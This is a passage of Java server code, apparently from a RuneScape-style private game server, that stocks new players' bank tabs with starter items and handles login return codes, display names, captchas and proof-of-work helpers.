						client.getItems().sendToTab(tab, Items.JUSTICIAR_FACEGUARD, equipment);
						client.getItems().sendToTab(tab, Items.JUSTICIAR_CHESTGUARD, equipment);
						client.getItems().sendToTab(tab, Items.JUSTICIAR_LEGGUARDS, equipment);

						client.getItems().sendToTab(tab, Items.INQUISITORS_GREAT_HELM, equipment);
						client.getItems().sendToTab(tab, Items.INQUISITORS_HAUBERK, equipment);
						client.getItems().sendToTab(tab, Items.INQUISITORS_PLATESKIRT, equipment);

						client.getItems().sendToTab(tab, Items.TORAGS_ARMOUR_SET, equipment);
						client.getItems().sendToTab(tab, Items.DHAROKS_ARMOUR_SET, equipment);
						client.getItems().sendToTab(tab, Items.GUTHANS_ARMOUR_SET, equipment);


						client.getItems().sendToTab(tab, Items.VIGGORAS_CHAINMACE, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_SPEAR, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_SCIMITAR, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_LONGSWORD, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_DAGGERPPLUSPLUS, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_BATTLEAXE, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_2H_SWORD, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_SWORD, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_MACE, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_WARHAMMER, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_CLAWS, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_HALBERD, equipment);
						client.getItems().sendToTab(tab, Items.CRYSTAL_HALBERD, equipment);

						client.getItems().sendToTab(tab, Items.GRANITE_MAUL, equipment);
						client.getItems().sendToTab(tab, Items.GRANITE_MAUL_OR, equipment);
						client.getItems().sendToTab(tab, Items.ABYSSAL_BLUDGEON, equipment);
						client.getItems().sendToTab(tab, Items.ABYSSAL_WHIP, equipment);
						client.getItems().sendToTab(tab, Items.ABYSSAL_TENTACLE, equipment);
						client.getItems().sendToTab(tab, Items.VESTAS_SPEAR, equipment);
						client.getItems().sendToTab(tab, Items.VESTAS_LONGSWORD, equipment);
						client.getItems().sendToTab(tab, Items.STATIUSS_WARHAMMER, equipment);
						client.getItems().sendToTab(tab, Items.ZAMORAKIAN_SPEAR, equipment);
						client.getItems().sendToTab(tab, Items.ZAMORAKIAN_HASTA, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_HUNTER_LANCE, equipment);

						client.getItems().sendToTab(tab, Items.ELDER_MAUL, equipment);
						client.getItems().sendToTab(tab, Items.INQUISITORS_MACE, equipment);
						client.getItems().sendToTab(tab, Items.GHRAZI_RAPIER, equipment);

						client.getItems().sendToTab(tab, Items.SCYTHE_OF_VITUR, equipment);
						client.getItems().sendToTab(tab, Items.ARMADYL_GODSWORD, equipment);
						client.getItems().sendToTab(tab, Items.SARADOMIN_GODSWORD, equipment);
						client.getItems().sendToTab(tab, Items.ZAMORAK_GODSWORD, equipment);
						client.getItems().sendToTab(tab, Items.BANDOS_GODSWORD, equipment);
						client.getItems().sendToTab(tab, Items.SARADOMIN_SWORD, equipment);
						client.getItems().sendToTab(tab, Items.SARADOMINS_BLESSED_SWORD, equipment);
						client.getItems().sendToTab(tab, Items.BLADE_OF_SAELDOR, equipment);

						client.getItems().sendToTab(tab, Items.ARCLIGHT, equipment);
						client.getItems().sendToTab(tab, Items.DARKLIGHT, equipment);
						client.getItems().sendToTab(tab, Items.EXCALIBUR, equipment);

						client.getItems().sendToTab(tab, Items.TOKTZ_XIL_EK, equipment);
						client.getItems().sendToTab(tab, Items.TOKTZ_XIL_AK, equipment);
						client.getItems().sendToTab(tab, Items.TZHAAR_KET_OM, equipment);
						client.getItems().sendToTab(tab, Items.TZHAAR_KET_EM, equipment);
						client.getItems().sendToTab(tab, Items.TOKTZ_MEJ_TAL, equipment);

						tab = magicTab;

						client.getItems().sendToTab(tab, Items.RUNE_POUCH, equipment);
						client.getItems().sendToTab(tab, Items.IMBUED_HEART, equipment);
						client.getItems().sendToTab(tab, Items.ETERNAL_BOOTS, equipment);
						client.getItems().sendToTab(tab, Items.TORMENTED_BRACELET, equipment);
						client.getItems().sendToTab(tab, Items.SEERS_RING_I, equipment);
						client.getItems().sendToTab(tab, Items.FARSEER_HELM, equipment);
						client.getItems().sendToTab(tab, Items.TOME_OF_FIRE, equipment);
						client.getItems().sendToTab(tab, Items.BURNT_PAGE, consumables);
						client.getItems().sendToTab(tab, Items.SARADOMIN_CAPE, equipment);
						client.getItems().sendToTab(tab, Items.IMBUED_SARADOMIN_CAPE, equipment);
						client.getItems().sendToTab(tab, Items.MALEDICTION_WARD, equipment);
						client.getItems().sendToTab(tab, Items.OCCULT_NECKLACE, equipment);
						client.getItems().sendToTab(tab, Items.THIRD_AGE_AMULET, equipment);
						client.getItems().sendToTab(tab, Items.ANCIENT_WYVERN_SHIELD, equipment);
						client.getItems().sendToTab(tab, Items.ETERNAL_BOOTS, equipment);
						client.getItems().sendToTab(tab, Items.MYSTIC_HAT, equipment);
						client.getItems().sendToTab(tab, Items.MYSTIC_ROBE_TOP, equipment);
						client.getItems().sendToTab(tab, Items.MYSTIC_ROBE_BOTTOM, equipment);
						client.getItems().sendToTab(tab, Items.MYSTIC_GLOVES, equipment);
						client.getItems().sendToTab(tab, Items.MYSTIC_BOOTS, equipment);
						client.getItems().sendToTab(tab, Items.AHRIMS_HOOD, equipment);
						client.getItems().sendToTab(tab, Items.AHRIMS_ROBETOP, equipment);
						client.getItems().sendToTab(tab, Items.AHRIMS_ROBESKIRT, equipment);
						client.getItems().sendToTab(tab, Items.ANCESTRAL_HAT, equipment);
						client.getItems().sendToTab(tab, Items.ANCESTRAL_ROBE_TOP, equipment);
						client.getItems().sendToTab(tab, Items.ANCESTRAL_ROBE_BOTTOM, equipment);
						client.getItems().sendToTab(tab, Items.AHRIMS_ARMOUR_SET, equipment);

						for (int i = 554; i <= 566; i++) {
							client.getItems().sendToTab(tab, i, consumables);
						}
						client.getItems().sendToTab(tab, 9075, consumables);
						client.getItems().sendToTab(tab, Items.WRATH_RUNE, consumables);

						client.getItems().sendToTab(tab, Items.THAMMARONS_SCEPTRE, equipment);
						client.getItems().sendToTab(tab, Items.SANGUINESTI_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.MYSTIC_AIR_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.MYSTIC_WATER_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.MYSTIC_EARTH_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.MYSTIC_FIRE_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.ZAMORAK_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.SARADOMIN_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.GUTHIX_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.IBANS_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.ANCIENT_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.MASTER_WAND, equipment);
						client.getItems().sendToTab(tab, Items.KODAI_WAND, equipment);
						client.getItems().sendToTab(tab, Items.TRIDENT_OF_THE_SEAS, equipment);
						client.getItems().sendToTab(tab, Items.TRIDENT_OF_THE_SWAMP, equipment);
						client.getItems().sendToTab(tab, Items.STAFF_OF_LIGHT, equipment);
						client.getItems().sendToTab(tab, Items.NIGHTMARE_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.ELDRITCH_NIGHTMARE_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.HARMONISED_NIGHTMARE_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.VOLATILE_NIGHTMARE_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.SLAYERS_STAFF, equipment);
						client.getItems().sendToTab(tab, Items.SLAYERS_STAFF_E, equipment);
						client.getItems().sendToTab(tab, Items.STAFF_OF_THE_DEAD, equipment);
						client.getItems().sendToTab(tab, Items.TOXIC_STAFF_OF_THE_DEAD, equipment);

						tab = skillingTab;
						client.getItems().sendToTab(tab, Items.PURE_ESSENCE, consumables);

						client.setSangStaffCharge(20_000);
						client.setToxicBlowpipeAmmoAmount(20_000);
						client.setToxicBlowpipeAmmo(Items.DRAGON_DART);
						client.setToxicTridentCharge(20_000);
						client.setTridentCharge(20_000);

						PvpWeapons.giveStartingCharges(client);
					}
				}
				Discord.writeServerSyncMessage("New player logged in: '" + name + "'.");
			}

			if (load == LoadGameResult.INVALID_CREDENTIALS) {
				returnCode = LoginReturnCode.INVALID_USERNAME_OR_PASSWORD;
			}

			// Set display name on successful load
			if (returnCode == LoginReturnCode.SUCCESS) {
				String displayName = fetchDisplayName(player, name,load == LoadGameResult.NEW_PLAYER);
				if (displayName == null) {
					returnCode = load == LoadGameResult.NEW_PLAYER ? LoginReturnCode.INVALID_USERNAME_OR_PASSWORD
							: LoginReturnCode.ERROR_OCCURRED_ON_PLAYER_LOAD;
					logger.error("Could not load display name for {}, newPlayer={}", name, load == LoadGameResult.NEW_PLAYER);
				} else {
					if (!player.isBot())
						logger.debug("Set \"{}\" display name to \"{}\".", player.getLoginName(), displayName);
					player.setDisplayName(displayName);
				}
			}
		}

		return returnCode;
	}

	private static String fetchDisplayName(Player player, String loginName, boolean newPlayer) throws Exception {
		if (Server.getConfiguration().isDisplayNamesDisabled()) {
			logger.info("Display names are disabled, using login name as display name.");
			return loginName;
		}

		if (!Server.getConfiguration().isLocalDatabaseEnabled()) {
			logger.info("Local SQL server is offline or configuration isn't set, setting display name to login name.");
			return loginName;
		}

		if (newPlayer) {
			boolean result = Server.getDatabaseManager().executeImmediate(new SetDisplayNameSqlQuery(loginName, loginName));
			if (!result) {
				return null;
			}

			return loginName;
		} else {
			String displayName = Server.getDatabaseManager().executeImmediate(new GetDisplayNameSqlQuery(loginName));
			if (displayName == null) {
				logger.error("Existing user could not login because they don't have a display name {}", player);
				return null;
			}

			return displayName;
		}
	}

	public void sendCode(final Channel channel, Player player, LoginReturnCode code, String...message) {
		List<String> msgs = new ArrayList<>();

		String msg = "[" + getStateString();

		if (player == null) {
			if (macAddress != null)
				msg += ", mac=" + macAddress;
			if (uuid != null)
				msg += ", uuid=" + uuid;
		}

		msg += "]";
		msgs.add(msg);

		msgs.addAll(Arrays.asList(message));
		sendReturnCode(channel, player, code, msgs.toArray(new String[0]));
	}

	public static void sendReturnCode(final Channel channel, Player player, LoginReturnCode code, String...message) {
		if (channel != null) {
			StringBuilder builder = new StringBuilder();
			builder.append("Login rejected with code ").append(code);
			if (player != null) {
				builder.append(" for player ").append(player.toString());
			}

			if (message != null) {
				builder.append(" ");
				Arrays.stream(message).forEach(it -> builder.append(it).append(", "));
			}

			logger.info(builder.toString());
			channel.write(new PacketBuilder().put((byte) code.getCode()).toPacket()).addListener(ChannelFutureListener.CLOSE);
			String msg = builder.toString();
			if (player != null) {
				log(player, msg);
			} else {
				log(getIP(channel), msg);
			}

			logger.debug(msg);
			channel.writeAndFlush(new PacketBuilder().put((byte) code.getCode()).toPacket()).addListener(ChannelFutureListener.CLOSE);
		}
	}

	private static void sendCaptcha(Channel channel, LoginReturnCode code, CaptchaRequirement requirement) {
		log(getIP(channel), "Captcha");
		channel.writeAndFlush(new PacketBuilder().put((byte) code.getCode())
				.putShort(requirement.getImage().length)
				.put(requirement.getImage()).toPacket())
				.addListener(ChannelFutureListener.CLOSE);
	}

	private static int getTrailingZeroBits(byte[] bigNumber) {
		int bits = 0;
		for (byte var4 : bigNumber) {
			int n = getTrailingZeroBits(var4);
			bits += n;
			if (n != 8) {
				break;
			}
		}
		return bits;
	}

	private static int getTrailingZeroBits(byte v) {
		if (v == 0) {
			return 8;
		}
		int bits = 0;
		int t = v & 255;
		while ((t & 128) == 0) {
			bits++;
			t <<= 1;
		}
		return bits;
	}

	/**
	 * Generates a random seed for 'proof of work'
	 * @param n The number of random characters to generate
	 *          within our seed
	 * @return A newly created seed
	 */
	private static String generateSeed(int n) {

		// chose a Character random from this String
		String AlphaNumericString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
				+ "0123456789"
				+ "abcdefghijklmnopqrstuvxyz";

		// create StringBuffer size of AlphaNumericString
		StringBuilder sb = new StringBuilder(n);

		for (int i = 0; i < n; i++) {

			// generate a random number between
			// 0 to AlphaNumericString variable length
			int index
					= (int) (AlphaNumericString.length()
					* Math.random());

			// add Character one by one in end of sb
			sb.append(AlphaNumericString
					.charAt(index));
		}

		return sb.toString();
	}

	public static String getIP(ChannelHandlerContext ctx) {
		return getIP(ctx.channel());
	}

	public static String getIP(Channel channel) {
		return ((InetSocketAddress) channel.remoteAddress()).getAddress().getHostAddress();
	}

	private static void log(String ip, String message) {
		Server.getLogging().batchWrite(new LoginRequestLog(ip, message));
	}

	private static void log(String ip, String mac, String uuid, String message) {
		Server.getLogging().batchWrite(new LoginRequestLog(ip, mac, uuid, message));
	}

	private static void log(Player player, String message) {
		log(player.connectedFrom, player.getMacAddress(), player.getUUID(), message);
	}

	private String getStateString() {
		switch (state) {
			case 1: return "POW Request";
			case 2: return "POW Check";
			case 3: return "Logging in";
			case 0: return "Connected";
			default: return "Unknown " + state;
		}
	}

	public static long getHandshakeRequests() {
		return HANDSHAKE_REQUESTS.get();
	}
}
